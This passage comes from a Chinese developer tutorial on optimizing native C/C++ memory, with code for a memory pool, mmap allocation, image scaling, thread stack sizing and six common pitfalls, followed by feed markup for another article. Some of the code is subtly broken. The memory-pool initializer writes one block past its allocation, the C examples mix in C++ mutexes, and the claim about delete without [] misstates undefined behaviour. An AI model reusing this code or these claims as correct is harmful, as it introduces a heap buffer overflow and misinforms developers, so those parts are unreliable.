    pool-&gt;head = (MemoryBlock*)<span class="hljs-built_in">malloc</span>(total_size);
    <span class="hljs-keyword">if</span> (pool-&gt;head == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-comment">// 初始化内存块链表，将所有内存块标记为未使用</span>
    MemoryBlock* current = pool-&gt;head;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; block_count; i++) {
        current-&gt;is_used = <span class="hljs-literal">false</span>;
        <span class="hljs-comment">// 计算下一个内存块的地址</span>
        current-&gt;next = (MemoryBlock*)((<span class="hljs-type">char</span>*)current + <span class="hljs-keyword">sizeof</span>(MemoryBlock) + block_size);
        current = current-&gt;next;
    }
    current-&gt;next = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 链表尾置空</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}

<span class="hljs-comment">// 从内存池中获取一块内存</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">alloc_from_pool</span><span class="hljs-params">(MemoryPool* pool)</span> {
    <span class="hljs-keyword">if</span> (pool == <span class="hljs-literal">NULL</span> || pool-&gt;head == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    }
    <span class="hljs-built_in">std</span>::lock_guard&lt;<span class="hljs-built_in">std</span>::mutex&gt; <span class="hljs-title function_">lock</span><span class="hljs-params">(pool-&gt;mutex)</span>;

    <span class="hljs-comment">// 遍历链表，找到未使用的内存块</span>
    MemoryBlock* current = pool-&gt;head;
    <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">if</span> (!current-&gt;is_used) {
            current-&gt;is_used = <span class="hljs-literal">true</span>;
            <span class="hljs-keyword">return</span> current-&gt;data; <span class="hljs-comment">// 返回数据区域的地址</span>
        }
        current = current-&gt;next;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 没有空闲内存块</span>
}

<span class="hljs-comment">// 归还内存块到内存池</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">free_to_pool</span><span class="hljs-params">(MemoryPool* pool, <span class="hljs-type">void</span>* ptr)</span> {
    <span class="hljs-keyword">if</span> (pool == <span class="hljs-literal">NULL</span> || pool-&gt;head == <span class="hljs-literal">NULL</span> || ptr == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-built_in">std</span>::lock_guard&lt;<span class="hljs-built_in">std</span>::mutex&gt; <span class="hljs-title function_">lock</span><span class="hljs-params">(pool-&gt;mutex)</span>;

    <span class="hljs-comment">// 计算内存块的起始地址（数据区域地址 - 结构体大小）</span>
    MemoryBlock* block = (MemoryBlock*)((<span class="hljs-type">char</span>*)ptr - <span class="hljs-keyword">sizeof</span>(MemoryBlock));
    block-&gt;is_used = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 标记为未使用，供下次复用</span>
}

<span class="hljs-comment">// 销毁内存池，释放所有内存</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">destroy_memory_pool</span><span class="hljs-params">(MemoryPool* pool)</span> {
    <span class="hljs-keyword">if</span> (pool == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-built_in">free</span>(pool-&gt;head);
    pool-&gt;head = <span class="hljs-literal">NULL</span>;
    pool-&gt;block_size = <span class="hljs-number">0</span>;
    pool-&gt;block_count = <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    MemoryPool pool;
    <span class="hljs-comment">// 初始化内存池：每个内存块1KB，共100个</span>
    init_memory_pool(&amp;pool, <span class="hljs-number">1024</span>, <span class="hljs-number">100</span>);

    <span class="hljs-comment">// 从池中获取内存</span>
    <span class="hljs-type">void</span>* buf1 = alloc_from_pool(&amp;pool);
    <span class="hljs-type">void</span>* buf2 = alloc_from_pool(&amp;pool);

    <span class="hljs-comment">// 使用内存...</span>

    <span class="hljs-comment">// 归还内存到池中</span>
    free_to_pool(&amp;pool, buf1);
    free_to_pool(&amp;pool, buf2);

    <span class="hljs-comment">// 销毁内存池</span>
    destroy_memory_pool(&amp;pool);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<p>内存池的核心优势：减少malloc/free的调用次数，避免内存碎片；内存分配/释放的效率更高（只需遍历链表、修改标记）；适合固定大小的内存分配场景。如果需要分配不同大小的内存，可以设计“多级内存池”（比如1KB、4KB、8KB等不同规格的内存块）。</p>
<h3 data-id="heading-36">3.3 内存碎片优化：避免“内存碎片化”导致的OOM</h3>
<p>内存碎片是Native内存的另一个“隐形杀手”——虽然总空闲内存足够，但这些空闲内存被分割成多个零散的小块，无法分配出一块连续的大内存，最终导致OOM。比如：系统总空闲内存100MB，但最大的连续空闲块只有1MB，此时要分配2MB内存就会失败。</p>
<p>内存碎片主要分为两种：</p>
<ul>
<li>
<p><strong>内部碎片</strong>：分配的内存块比实际需要的大，导致内存浪费（比如需要1KB，却分配了2KB）；</p>
</li>
<li>
<p><strong>外部碎片</strong>：频繁分配/释放不同大小的内存块，导致空闲内存被分割成零散的小块。</p>
</li>
</ul>
<h4 data-id="heading-37">优化方案：</h4>
<h5 data-id="heading-38">（1）减少内部碎片：按需分配内存</h5>
<p>避免分配超出需求的内存，比如需要存储100个字符的字符串，就分配101字节（预留1字节存结束符），而不是分配1KB。同时，对于固定大小的数据结构，尽量统一规格，减少内存浪费。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-comment">// 不好的写法：分配1KB内存，只使用101字节，内部碎片严重</span>
<span class="hljs-type">char</span>* <span class="hljs-title function_">bad_alloc</span><span class="hljs-params">()</span> {
    <span class="hljs-type">char</span>* buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1024</span>);
    <span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">"hello world"</span>); <span class="hljs-comment">// 仅使用12字节（含结束符）</span>
    <span class="hljs-keyword">return</span> buf;
}

<span class="hljs-comment">// 好的写法：按需分配，减少内部碎片</span>
<span class="hljs-type">char</span>* <span class="hljs-title function_">good_alloc</span><span class="hljs-params">()</span> {
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* str = <span class="hljs-string">"hello world"</span>;
    <span class="hljs-type">size_t</span> size = <span class="hljs-built_in">strlen</span>(str) + <span class="hljs-number">1</span>; <span class="hljs-comment">// 按需计算大小（12字节）</span>
    <span class="hljs-type">char</span>* buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);
    <span class="hljs-keyword">if</span> (buf != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">strcpy</span>(buf, str);
    }
    <span class="hljs-keyword">return</span> buf;
}

</code></pre>
<h5 data-id="heading-39">（2）减少外部碎片：使用内存池+避免频繁分配/释放</h5>
<p>如前文所述，内存池能避免频繁分配/释放不同大小的内存块，减少外部碎片。此外，还可以采取以下技巧：</p>
<ul>
<li>
<p>优先使用大的连续内存块，避免频繁分配/释放小内存块；</p>
</li>
<li>
<p>对于长期使用的内存，一次性分配足够的大小，避免多次realloc（realloc可能会移动内存，导致碎片）；</p>
</li>
<li>
<p>尽量在程序启动时分配长期使用的内存，程序退出时统一释放，减少中间频繁的分配/释放操作。</p>
</li>
</ul>
<h5 data-id="heading-40">（3）使用mmap分配大内存（适合超过1MB的内存）</h5>
<p>对于超过1MB的大内存分配，推荐使用mmap替代malloc，因为mmap分配的内存来自系统的匿名共享内存，不会占用Native堆的空间，且释放时能完全回收，减少碎片。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span>

<span class="hljs-comment">// 使用mmap分配大内存</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">mmap_alloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span> {
    <span class="hljs-keyword">if</span> (size == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    }
    <span class="hljs-comment">// 打开匿名共享内存</span>
    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">"/dev/zero"</span>, O_RDWR);
    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    }
    <span class="hljs-comment">// 分配内存：addr=NULL（系统自动分配），length=size，prot=读写，flags=共享，fd=匿名内存，offset=0</span>
    <span class="hljs-type">void</span>* ptr = mmap(<span class="hljs-literal">NULL</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>);
    close(fd); <span class="hljs-comment">// 关闭文件描述符，不影响内存分配</span>
    <span class="hljs-keyword">if</span> (ptr == MAP_FAILED) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    }
    <span class="hljs-keyword">return</span> ptr;
}

<span class="hljs-comment">// 释放mmap分配的内存</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">mmap_free</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr, <span class="hljs-type">size_t</span> size)</span> {
    <span class="hljs-keyword">if</span> (ptr != <span class="hljs-literal">NULL</span> &amp;&amp; ptr != MAP_FAILED) {
        munmap(ptr, size);
    }
}

<span class="hljs-comment">// 使用示例：分配10MB内存</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">size_t</span> size = <span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// 10MB</span>
    <span class="hljs-type">void</span>* buf = mmap_alloc(size);
    <span class="hljs-keyword">if</span> (buf != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-comment">// 使用内存...</span>
        mmap_free(buf, size);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<h3 data-id="heading-41">3.4 特殊场景优化：图片/文件/线程栈内存</h3>
<p>除了通用的内存优化技巧，针对Native开发中常见的特殊场景（比如图片处理、文件读写、线程创建），还有针对性的优化方案。</p>
<h4 data-id="heading-42">场景1：图片处理内存优化</h4>
<p>图片处理是Native内存占用的“重灾区”，比如加载一张1080P的图片（分辨率1920<em>1080），如果使用ARGB_8888格式，内存占用为：1920</em>1080*4 = 8294400字节（约8MB），如果加载多张图片，内存很容易暴涨。</p>
<p>优化技巧：</p>
<ul>
<li>
<p>按需缩放图片：根据展示尺寸缩放图片，避免加载原始尺寸的图片（比如展示尺寸为960*540，就缩放为原来的1/2，内存占用减少为原来的1/4）；</p>
</li>
<li>
<p>选择合适的像素格式：比如使用RGB_565格式（每个像素占2字节），比ARGB_8888（4字节）节省一半内存；</p>
</li>
<li>
<p>图片复用：使用内存池复用图片缓冲区，避免每次加载图片都分配新内存；</p>
</li>
<li>
<p>及时释放图片内存：图片展示完成后，立即释放缓冲区内存，避免长期持有。</p>
</li>
</ul>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 简化示例：图片缩放与内存复用</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-comment">// 图片结构体</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Image</span> {</span>
    <span class="hljs-type">int</span> width;
    <span class="hljs-type">int</span> height;
    <span class="hljs-type">int</span> format; <span class="hljs-comment">// 像素格式：0=ARGB_8888，1=RGB_565</span>
    <span class="hljs-type">char</span>* data; <span class="hljs-comment">// 图片数据缓冲区</span>
} Image;

<span class="hljs-comment">// 缩放图片：将原始图片缩放到目标尺寸，复用目标图片的缓冲区</span>
<span class="hljs-type">bool</span> <span class="hljs-title function_">scale_image</span><span class="hljs-params">(<span class="hljs-type">const</span> Image* src, Image* dst)</span> {
    <span class="hljs-keyword">if</span> (src == <span class="hljs-literal">NULL</span> || dst == <span class="hljs-literal">NULL</span> || src-&gt;data == <span class="hljs-literal">NULL</span> || dst-&gt;data == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    <span class="hljs-comment">// 计算原始图片和目标图片的像素大小</span>
    <span class="hljs-type">int</span> src_pixel_size = (src-&gt;format == <span class="hljs-number">0</span>) ? <span class="hljs-number">4</span> : <span class="hljs-number">2</span>;
    <span class="hljs-type">int</span> dst_pixel_size = (dst-&gt;format == <span class="hljs-number">0</span>) ? <span class="hljs-number">4</span> : <span class="hljs-number">2</span>;

    <span class="hljs-comment">// 计算需要的缓冲区大小，避免缓冲区溢出</span>
    <span class="hljs-type">size_t</span> dst_data_size = dst-&gt;width * dst-&gt;height * dst_pixel_size;
    <span class="hljs-comment">// 假设dst-&gt;data已通过内存池分配好，这里直接复用</span>

    <span class="hljs-comment">// 简化的缩放逻辑（实际需根据插值算法实现）</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y = <span class="hljs-number">0</span>; y &lt; dst-&gt;height; y++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x &lt; dst-&gt;width; x++) {
            <span class="hljs-comment">// 计算原始图片的对应坐标</span>
            <span class="hljs-type">int</span> src_x = x * src-&gt;width / dst-&gt;width;
            <span class="hljs-type">int</span> src_y = y * src-&gt;height / dst-&gt;height;
            <span class="hljs-comment">// 拷贝像素数据（简化处理）</span>
            <span class="hljs-built_in">memcpy</span>(
                dst-&gt;data + (y * dst-&gt;width + x) * dst_pixel_size,
                src-&gt;data + (src_y * src-&gt;width + src_x) * src_pixel_size,
                dst_pixel_size
            );
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}

</code></pre>
<h4 data-id="heading-43">场景2：文件读写内存优化</h4>
<p>频繁的文件读写如果不优化，会频繁分配内存缓冲区，导致内存碎片。优化技巧：</p>
<ul>
<li>
<p>复用缓冲区：创建一个固定大小的缓冲区，重复用于文件读写，避免每次读写都分配新缓冲区；</p>
</li>
<li>
<p>合理设置缓冲区大小：缓冲区太小会导致频繁读写，太大则浪费内存，一般设置为4KB或8KB（与系统页大小一致）；</p>
</li>
<li>
<p>使用mmap映射文件：对于大文件（比如超过10MB），使用mmap将文件映射到内存，避免读取文件时分配大量内存缓冲区。</p>
</li>
</ul>
<h4 data-id="heading-44">场景3：线程栈内存优化</h4>
<p>每个Native线程都会分配一定大小的栈内存（默认一般为1MB），如果创建大量线程，线程栈内存会占用大量空间（比如创建100个线程，默认占用100MB栈内存）。</p>
<p>优化技巧：</p>
<ul>
<li>
<p>减少线程数量：使用线程池复用线程，避免频繁创建新线程；</p>
</li>
<li>
<p>调整线程栈大小：对于不需要大量栈内存的线程（比如简单的计算线程），创建时指定较小的栈大小（比如512KB），减少内存占用。</p>
</li>
</ul>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-comment">// 线程执行函数</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">thread_func</span><span class="hljs-params">(<span class="hljs-type">void</span>* arg)</span> {
    <span class="hljs-comment">// 线程业务逻辑...</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
}

<span class="hljs-comment">// 创建线程并设置栈大小</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">create_thread_with_stack_size</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span>* thread, <span class="hljs-type">size_t</span> stack_size)</span> {
    <span class="hljs-type">pthread_attr_t</span> attr;
    <span class="hljs-type">int</span> ret = pthread_attr_init(&amp;attr);
    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> ret;
    }
    <span class="hljs-comment">// 设置线程栈大小</span>
    ret = pthread_attr_setstacksize(&amp;attr, stack_size);
    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) {
        pthread_attr_destroy(&amp;attr);
        <span class="hljs-keyword">return</span> ret;
    }
    <span class="hljs-comment">// 创建线程</span>
    ret = pthread_create(thread, &amp;attr, thread_func, <span class="hljs-literal">NULL</span>);
    pthread_attr_destroy(&amp;attr);
    <span class="hljs-keyword">return</span> ret;
}

<span class="hljs-comment">// 使用示例：创建栈大小为512KB的线程</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">pthread_t</span> thread;
    <span class="hljs-type">size_t</span> stack_size = <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// 512KB</span>
    <span class="hljs-type">int</span> ret = create_thread_with_stack_size(&amp;thread, stack_size);
    <span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) {
        pthread_join(thread, <span class="hljs-literal">NULL</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<h2 data-id="heading-45">四、避坑指南：这些Native内存“坑”千万别踩</h2>
<p>Native内存优化的路上，有很多“隐形坑”，一不小心就会导致内存泄漏、崩溃，下面整理了最常见的6个坑，帮你避坑避雷。</p>
<h3 data-id="heading-46">坑1：重复释放内存</h3>
<p>同一指针被free/delete多次，会导致程序崩溃，尤其是在多线程场景中，容易出现“多个线程释放同一内存”的问题。</p>
<p>避坑方案：释放内存后，将指针置空；多线程场景中，使用互斥锁保护内存释放操作，避免重复释放。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>

<span class="hljs-built_in">std</span>::mutex m_mutex;
<span class="hljs-type">char</span>* buf = <span class="hljs-literal">NULL</span>;

<span class="hljs-type">void</span> <span class="hljs-title function_">safe_free</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">std</span>::lock_guard&lt;<span class="hljs-built_in">std</span>::mutex&gt; <span class="hljs-title function_">lock</span><span class="hljs-params">(m_mutex)</span>;
    <span class="hljs-keyword">if</span> (buf != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">free</span>(buf);
        buf = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 置空指针，避免重复释放</span>
    }
}

</code></pre>
<h3 data-id="heading-47">坑2：野指针访问</h3>
<p>内存被释放后，指针未置空，后续又使用该指针，会导致未知错误（崩溃、数据错乱），且排查难度极大。</p>
<p>避坑方案：释放内存后，立即将指针置空；使用指针前，先判断指针是否为空。</p>
<h3 data-id="heading-48">坑3：C++数组用delete释放（未加[]）</h3>
<p>用new[]分配的数组，用delete释放，会导致数组中除首元素外的内存无法释放，形成隐蔽性内存泄漏。</p>
<p>避坑方案：严格遵循“new[]配delete[]，new配delete”的原则，不要混淆使用。</p>
<h3 data-id="heading-49">坑4：智能指针循环引用</h3>
<p>C++的shared_ptr如果出现循环引用（A持有B的shared_ptr，B持有A的shared_ptr），会导致两个对象都无法释放，形成内存泄漏。</p>
<p>避坑方案：将其中一方的shared_ptr改为weak_ptr（弱引用），weak_ptr不增加引用计数，避免循环引用。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory&gt;</span></span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>; <span class="hljs-comment">// 前置声明</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> {
<span class="hljs-keyword">public</span>:
    std::weak_ptr&lt;B&gt; b_ptr; <span class="hljs-comment">// 用weak_ptr替代shared_ptr</span>
    ~<span class="hljs-built_in">A</span>() { <span class="hljs-built_in">printf</span>(<span class="hljs-string">"A destroyed\n"</span>); }
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> {
<span class="hljs-keyword">public</span>:
    std::shared_ptr&lt;A&gt; a_ptr;
    ~<span class="hljs-built_in">B</span>() { <span class="hljs-built_in">printf</span>(<span class="hljs-string">"B destroyed\n"</span>); }
};

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">auto</span> a = std::<span class="hljs-built_in">make_shared</span>&lt;A&gt;();
    <span class="hljs-keyword">auto</span> b = std::<span class="hljs-built_in">make_shared</span>&lt;B&gt;();
    a-&gt;b_ptr = b;
    b-&gt;a_ptr = a;
    <span class="hljs-comment">// 退出时，a和b会被正常销毁，避免循环引用泄漏</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<h3 data-id="heading-50">坑5：忽略内存分配失败的情况</h3>
<p>调用malloc、new等函数时，默认认为内存分配成功，但实际中可能因内存不足导致分配失败（返回NULL或抛出异常），如果不处理，会导致程序崩溃。</p>
<p>避坑方案：针对不同分配方式，做针对性的失败处理，避免直接使用未分配成功的指针。</p>
<h4 data-id="heading-51">C语言（malloc/calloc/realloc）：强制判断返回值</h4>
<p>malloc、calloc、realloc分配失败时会返回NULL，必须在分配后立即判断，避免使用NULL指针操作内存。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">void</span> <span class="hljs-title function_">safe_malloc</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 分配1MB内存</span>
    <span class="hljs-type">char</span>* buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);
    <span class="hljs-comment">// 关键：判断分配是否成功</span>
    <span class="hljs-keyword">if</span> (buf == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"内存分配失败\n"</span>);
        <span class="hljs-comment">// 容错处理：返回、退出或使用备用方案</span>
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// 业务逻辑...</span>
    <span class="hljs-built_in">free</span>(buf);
    buf = <span class="hljs-literal">NULL</span>;
}

</code></pre>
<h4 data-id="heading-52">C++（new）：捕获异常或使用nothrow版本</h4>
<p>C++的new默认会抛出std::bad_alloc异常，若未捕获会导致程序崩溃；也可使用new(nothrow)版本，分配失败返回NULL，类似C语言的malloc。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;new&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">safe_new</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// 方案1：捕获异常（推荐，符合C++异常机制）</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">int</span>* p = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>]; <span class="hljs-comment">// 分配4MB内存</span>
        <span class="hljs-comment">// 业务逻辑...</span>
        <span class="hljs-keyword">delete</span>[] p;
    } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> std::bad_alloc&amp; e) {
        <span class="hljs-comment">// 捕获内存分配失败异常，做容错处理</span>
        std::cerr &lt;&lt; <span class="hljs-string">"内存分配失败："</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;
    }

    <span class="hljs-comment">// 方案2：使用nothrow版本，返回NULL</span>
    <span class="hljs-type">int</span>* q = <span class="hljs-built_in">new</span> (std::nothrow) <span class="hljs-type">int</span>[<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>];
    <span class="hljs-keyword">if</span> (q == <span class="hljs-literal">NULL</span>) {
        std::cerr &lt;&lt; <span class="hljs-string">"内存分配失败"</span> &lt;&lt; std::endl;
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// 业务逻辑...</span>
    <span class="hljs-keyword">delete</span>[] q;
}

</code></pre>
<p>注意：内存分配失败后，不要强行使用指针，应做容错处理（比如降低内存占用、释放其他无用内存后重试、提示用户等）。</p>
<h3 data-id="heading-53">坑6：mmap分配后未检查MAP_FAILED</h3>
<p>前文提到mmap适合分配大内存，但很多开发者会忽略mmap的返回值检查——mmap分配失败时返回MAP_FAILED（本质是(void*)-1），而非NULL，若误判为NULL会导致后续操作出错。</p>
<p>避坑方案：分配后严格检查返回值是否为MAP_FAILED，同时处理文件描述符打开失败的情况。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">void</span> <span class="hljs-title function_">safe_mmap</span><span class="hljs-params">()</span> {
    <span class="hljs-type">size_t</span> size = <span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// 10MB</span>
    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">"/dev/zero"</span>, O_RDWR);
    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"打开匿名内存失败"</span>);
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// 分配内存</span>
    <span class="hljs-type">void</span>* ptr = mmap(<span class="hljs-literal">NULL</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>);
    close(fd);
    <span class="hljs-comment">// 关键：检查是否分配成功（区分NULL和MAP_FAILED）</span>
    <span class="hljs-keyword">if</span> (ptr == MAP_FAILED) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"mmap内存分配失败"</span>);
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// 业务逻辑...</span>
    munmap(ptr, size);
}

</code></pre>
<p>易错点：不要用“if (ptr == NULL)”判断mmap是否成功，因为MAP_FAILED是(void*)-1，和NULL（0）是两个不同的值，误判会导致分配失败后仍继续使用无效指针。</p>
<h2 data-id="heading-54">五、总结：Native内存优化的核心逻辑</h2>
<p>Native内存优化不是“一次性操作”，而是贯穿开发、测试、上线全流程的习惯——底层要懂“分配-释放”的规则，排查要会用工具定位问题，编码要避开常见坑，核心围绕三点：</p>
<ul>
<li>
<p><strong>可控</strong>：每一次内存分配，都要有对应的释放逻辑，杜绝“分配后不管”；</p>
</li>
<li>
<p><strong>高效</strong>：通过内存池、对象池复用内存，减少频繁分配/释放，降低碎片；</p>
</li>
<li>
<p><strong>容错</strong>：处理内存分配失败的情况，避免无效指针操作导致的崩溃。</p>
</li>
</ul>
<p>相比Java内存优化，Native内存更考验开发者的底层功底，但只要掌握本文的工具用法和编码技巧，就能把“野孩子”驯服成“贴心管家”，让APP摆脱卡顿、闪退，实现更流畅的运行体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[浅析Vite前端构建工具]]></title>    <link>https://juejin.cn/post/7602243150157774875</link>    <guid>https://juejin.cn/post/7602243150157774875</guid>    <pubDate>2026-02-03T04:22:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602243150157774875" data-draft-id="7602154088477081638" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="浅析Vite前端构建工具"/> <meta itemprop="keywords" content="Vite"/> <meta itemprop="datePublished" content="2026-02-03T04:22:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="saberxyL"/> <meta itemprop="url" content="https://juejin.cn/user/3942228504379243"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div 